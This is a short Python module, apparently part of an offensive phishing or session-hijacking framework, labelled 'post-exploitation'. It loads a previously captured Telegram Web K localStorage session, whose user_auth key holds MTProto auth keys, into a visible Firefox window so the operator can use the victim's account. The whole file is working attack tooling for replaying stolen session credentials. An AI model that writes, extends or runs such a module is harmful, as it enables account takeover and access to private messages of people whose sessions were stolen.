# -*- coding: utf-8 -*-
# Telegram post-exploitation module
# Operates on a previously captured Telegram localStorage session (Web K).
from core.color import error, status
from core.module_utils import load_post_session, resolve_post_session, types


class info:
    author = "Puneet Chandra Chaudhary - D0C70R"
    short_description = "Telegram post-session interaction (open captured session)"
    full_description = (
        "Loads a previously captured Telegram Web K localStorage session into a "
        "visible Firefox browser window so you can interact with it. "
        "Telegram stores MTProto auth keys in localStorage (key: user_auth). "
        "Set session_id to the ID shown by 'sessions -l'."
    )


class execution:
    module_type = types.post
    name = "telegram"
    url = "https://web.telegram.org/k/"
    session_type = "localstorage"

    @staticmethod
    def run(global_options, visible_browser):
        """Open the captured Telegram session in a visible browser window."""
        try:
            session_id = resolve_post_session(
                global_options, module_name="telegram", session_type="localstorage"
            )
        except Exception as exc:
            error(str(exc))
            return

        status(f"Loading Telegram session [{session_id}]...")
        load_post_session("localstorage", session_id, visible_browser)
